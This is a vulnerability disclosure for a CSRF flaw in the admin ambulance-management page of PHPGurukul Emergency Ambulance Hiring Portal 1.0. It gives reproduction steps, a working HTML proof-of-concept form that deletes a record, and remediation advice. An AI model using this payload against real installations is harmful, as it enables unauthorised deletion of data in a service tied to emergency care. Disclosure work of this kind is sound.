## Emergency Ambulance Hiring Portal 

**Bug Description:**

A Cross Site Request Forgery (CSRF) vulnerability in "/admin/manage-ambulance.php" endpoint of PHPGurukul Emergency Ambulance Hiring Portal 1.0 allows attackers to "Delete an Ambulance" via a crafted html request.


Steps to Reproduce:

```
# Exploit Title: Cross Site Request Forgery (CSRF) vulnerability in Emergency Ambulance Hiring Portal 
# Date: 28-03-2024
# Exploit Author: dhabaleshwardas
# Vendor Homepage: https://phpgurukul.com/
# Software Link: https://phpgurukul.com/emergency-ambulance-hiring-portal-using-php-and-mysql/
# Version: 1.0
# Tested on: firefox/chrome/brave
# CVE:
```


To reproduce the attack:

1- Head to the http://localhost/eahp/admin/manage-ambulance.php after logging into the admin account.


<img width="830" alt="1" src="https://github.com/dhabaleshwar/Open-Source-Vulnerabilities/assets/132373212/9d3ea2a0-7c99-4201-a241-ff82396794b1">


2- Here you can see that we are going to delete the ambulance with "XYZ1234" number , for that we will use the HTML code we have written.


<img width="450" alt="3" src="https://github.com/dhabaleshwar/Open-Source-Vulnerabilities/assets/132373212/9d1c2ddd-ed72-41d9-8a31-56e35f4a5887">


```
<html>
  <!-- CSRF PoC --->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/eahp/admin/manage-ambulance.php">
      <input type="hidden" name="del" value="10" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

3- We'll then execute this HTML code and we successfully see that the record has been deleted successfully.


<img width="611" alt="4" src="https://github.com/dhabaleshwar/Open-Source-Vulnerabilities/assets/132373212/38c8c967-9f61-4b19-9413-5a240ba8ae05">


4- This shows that the endpoint "/admin/manage-ambulance.php" is vulnerable to CSRF attack.


<img width="958" alt="5" src="https://github.com/dhabaleshwar/Open-Source-Vulnerabilities/assets/132373212/33999040-6fa6-4c98-a842-e19820eec5b0">


5- CSRF attacks can lead to unauthorized actions being performed on behalf of a user. An attacker could manipulate data within the application, leading to the creation, modification, or deletion of records.


Remediation:

1- Implement anti-CSRF tokens (also known as CSRF tokens or synchronizer tokens) in web forms. These tokens are unique per session and are embedded in the HTML form. The server validates the token with each form submission, ensuring that the request is legitimate.

2- Set the SameSite attribute on cookies to control when they are sent with cross-origin requests. This helps mitigate the risk of CSRF by preventing the automatic inclusion of cookies in cross-site requests.
